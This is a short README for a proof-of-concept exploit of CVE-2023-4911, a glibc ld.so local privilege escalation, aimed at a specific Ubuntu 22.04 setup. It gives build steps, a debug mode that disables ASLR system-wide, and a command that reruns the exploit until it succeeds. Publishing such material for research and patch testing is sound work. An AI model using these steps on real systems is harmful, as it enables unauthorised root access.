# CVE-2023-4911

https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt

Proof-of-Concept

Developed for:

- Ubuntu 22.04
- Ubuntu GLIBC 2.35-0ubuntu3.1
- su from util-linux 2.37.2
- ASLR ON

Dockerfile included.

## Debug

Disable ASLR

```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Compile with `NO_ASLR`

```
$ python3 patch.py
$ gcc poc.c -o poc_debug -DNO_ASLR
```

Run gdbscript

```
gdb -ix gdbscript
```

## Build

```
$ python3 patch.py
$ gcc poc.c -o poc
```

## Usage

```
./poc; while [ $? -ne 0 ]; do ./poc; done
```
